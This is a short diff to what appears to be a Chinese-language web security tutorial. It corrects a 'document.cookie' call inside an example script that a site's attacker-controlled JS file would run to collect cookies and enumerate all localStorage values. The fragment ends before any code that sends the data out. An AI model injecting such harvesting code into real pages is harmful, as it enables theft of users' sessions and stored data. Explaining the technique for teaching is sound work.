@@ -11,7 +11,7 @@
 3.這時假設剛才的test.js 改為 你的網域下的一隻js程式碼，然後該程式碼內含有
 
 ```
-var test1 = document.cookie();
+var test1 = document.cookie;
 function allStorage() {
     var values = [],
         keys = Object.keys(localStorage),
